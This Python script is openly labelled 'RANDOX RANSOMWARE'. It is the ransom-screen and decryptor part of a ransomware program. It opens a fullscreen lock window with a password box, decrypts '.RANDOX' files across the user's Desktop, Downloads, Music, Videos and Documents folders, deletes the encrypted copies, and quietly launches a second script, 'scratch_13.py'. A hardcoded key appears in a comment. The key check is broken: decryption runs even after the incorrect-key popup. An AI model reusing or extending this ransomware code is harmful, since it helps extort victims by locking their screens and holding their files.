
import time
import tkinter as tk
from tkinter import *
from tkVideoPlayer import TkinterVideo
from win32api import GetSystemMetrics
import subprocess
import datetime


#Create an instance of Tkinter frame
root= Tk()
root.title("RANDOX RANSOMWARE")
#Set the Geometry
root.geometry(str(GetSystemMetrics(0))+"x"+str(GetSystemMetrics(1)))
#Full Screen Window
#name_entry =Entry(root)
#name_entry.grid(row=0, column=1)
bg = PhotoImage( file = "CC-12-1.png")
label1 = Label( root, image = bg)
label1.place(x = 0,y = 0)
#name_var=tk.StringVar()
def vd():
    videoplayer = TkinterVideo(master=root, scaled=False)
    videoplayer.load(r"sm.mp4")
    videoplayer.pack(expand=True, fill="both")

    videoplayer.play()
#vd()
def submit1():
    name=name_var.get()
    if name == "oops":
        vd()
def submit():
    #name=name_var.get()
    password=passw_var.get()

    #print("The name is : " + name)
    print("The password is : " + password)
    name_var.set("")
    passw_var.set("")
    import pyAesCrypt
    import pathlib
    import os
    key = password

    def decrypt(key, source):
        dfile = source.split(".")
        output = dfile[0] + "." + dfile[-2]
        pyAesCrypt.decryptFile(source, output, key)
    try:
        desktop1 = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        os.chdir(desktop1)
        decrypt(key,'KChecK45789.txt.RANDOX')

    except:
        top = Toplevel(root)
        top.geometry("750x250")
        top.title("INCORRECT KEY")
        Label(top, text="INCORRECT KEY", font=('Mistral 18 bold')).place(x=150, y=80)

    import pathlib
    import pyAesCrypt
    import os
    import time
    desktop1 = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    os.chdir(desktop1)
    with open('KChecK45789.txt') as f:
        lines = f.readlines()
    key = lines[0]

    # print("Key Taken : ",lines[0])
    def decrypt(key, source):
        dfile = source.split(".")
        output = dfile[0] + "." + dfile[-2]
        pyAesCrypt.decryptFile(source, output, key)

    subprocess.Popen(['python', 'scratch_13.py'])
    l1 = ['Desktop', 'Downloads', 'Music', 'Videos', 'Documents']
    for i1 in l1:
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), i1)
        print(desktop)
        os.chdir(desktop)
        for i in os.listdir():
            file_extension = pathlib.Path(i).suffix
            if file_extension == '.RANDOX':
                print("PASSED")
                decrypt(key, i)
                os.remove(i)


#d6RibM7C2WTd7FW2

def onclick(event):
    submit()
name_var=tk.StringVar()
passw_var=tk.StringVar()
#name_label = tk.Label(root, text = 'Username', font=('calibre',10, 'bold'))

#name_entry= tk.Entry(root,textvariable = name_var, font=('calibre',10,'normal'))

passw_label = tk.Label(root, text = 'By RANDOXER', font = ('calibre',10,'bold'))
passw_entry=tk.Entry(root, textvariable = passw_var, font = ('calibre',10,'normal'), show = '*')


sub_btn=tk.Button(root,text = 'Submit', command = submit)

#name_label.grid(row=0,column=0)

sub_btn.bind('<Button-1>', onclick)
#sub_btn.pack()
#name_entry.grid(row=0,column=1)
passw_label.grid(padx=1440, pady=140)
passw_entry.grid(padx=1440, pady=140)
#sub_btn.grid(padx=1440,pady=100)


root.bind('<Return>', onclick)
root.attributes('-fullscreen', True)
def quit_win():
   root.destroy()
#popup()
sub_btn=tk.Button(root,text = 'Submit', command = submit)
button=Button(root,text="Alpha Testing : VER 00.090.alph.78", font=('Comic Sans', 13, 'bold'), command= quit_win)
#button.pack(pady=20)
root.mainloop()